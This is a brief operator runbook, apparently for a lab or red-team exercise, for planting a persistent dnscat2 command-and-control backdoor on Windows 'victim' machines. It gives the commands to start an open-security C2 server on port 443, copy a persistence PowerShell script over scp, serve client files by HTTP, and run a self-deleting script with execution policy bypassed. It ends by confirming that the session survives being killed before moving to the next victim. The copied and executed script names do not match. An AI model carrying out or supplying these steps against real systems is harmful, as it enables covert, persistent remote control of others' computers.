Step 1
[ON KALI 1 GUI On Proxmox]
Run ruby ./dnscat2.rb --security=open --dns=host=0.0.0.0,port=443 in a terminal at the directory /home/zathras/Desktop/dnscat/server.

Step 2
[ON KALI 1]
Run scp WindowsPersist.ps1 [victim user]@[victim ip]:/C:/Users/[victim user]/Desktop/ at the directory /home/zathras/Desktop.

Step 3
[ON KALI 1 Can be over SSH]
Run python3 -m http.server 8080 at the directory /home/zathras/Desktop/dnscat/clientwin.

Step 4
[ON WINDOWS VICTIM]
Run powershell -ExecutionPolicy Bypass -File .\7daystodie.ps1 at the directory C:/Users/[victim user]/Desktop/.
The .ps1 file will self-delete.

Step 5
Check the [Kali 1 GUI On Proxmox] to ensure the session went through.
Ctrl-C the session on [WINDOWS VICTIM] and ensure the session re-establishes in the background.

Step 6
Exit the VM and repeat on the next victim.